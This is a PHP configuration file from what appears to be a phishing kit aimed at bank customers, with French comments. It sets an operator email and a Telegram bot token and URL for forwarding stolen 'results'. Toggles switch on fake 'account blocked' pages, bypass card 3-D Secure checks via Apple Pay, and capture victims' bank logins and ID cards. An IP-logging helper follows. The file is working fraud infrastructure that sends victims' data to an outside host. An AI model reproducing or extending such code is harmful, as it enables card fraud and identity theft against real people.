<?php
$my_mail = "karimbaroui@yandex.com";            // Votre E-Mail pour recup rezult
$bot_token = "1887603520:AAGGmS-h96r_IM4Cvv-xmqfMSTVu1H-aEUE";                         // Le token du bot que vous aurez créer au préalable.
$telegram_group_id = "";
$telegram_session_id = "";
$urls = 'https://api.telegram.org/bot'.$bot_token.'/sendMessage?chat_id='.$telegram_group_id.'&text='.$message.'';


$timer = "10";                          // Nombre de secondes pour les pages sms-auth0.php / load.php / load1.php concernant le temps d'attente
$suspicious = "non";                    // Si tu veux la page "Nous avons bloqué votre compte" 
$apple_pay = "oui";                     // Si tu veux bypass vbv mais Apple Pay
$vbv = "non";                           // Si tu veux bypass vbv                         
$inc = "non";                           // Si tu veux bypass le inc
$log_bank = "non";                      // Si tu veux son log bank
$cni = "non";                           // Si tu veux sa cni



function _ip() {
            $ipaddress = '';
            if(getenv('HTTP_CLIENT_IP')){
                $ipaddress = getenv('HTTP_CLIENT_IP');
            }
            elseif(getenv('HTTP_X_FORWARDED_FOR')){
                $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
            }
            elseif(getenv('HTTP_X_FORWARDED')){
                $ipaddress = getenv('HTTP_X_FORWARDED');
            }
            elseif(getenv('HTTP_FORWARDED_FOR')){
                $ipaddress = getenv('HTTP_FORWARDED_FOR');
            }
            elseif(getenv('HTTP_FORWARDED')){
               $ipaddress = getenv('HTTP_FORWARDED');
            }
            elseif(getenv('REMOTE_ADDR')){
                $ipaddress = getenv('REMOTE_ADDR');
            }
            else{
                $ipaddress = 'UNKNOWN';
            }
            return $ipaddress;
        }
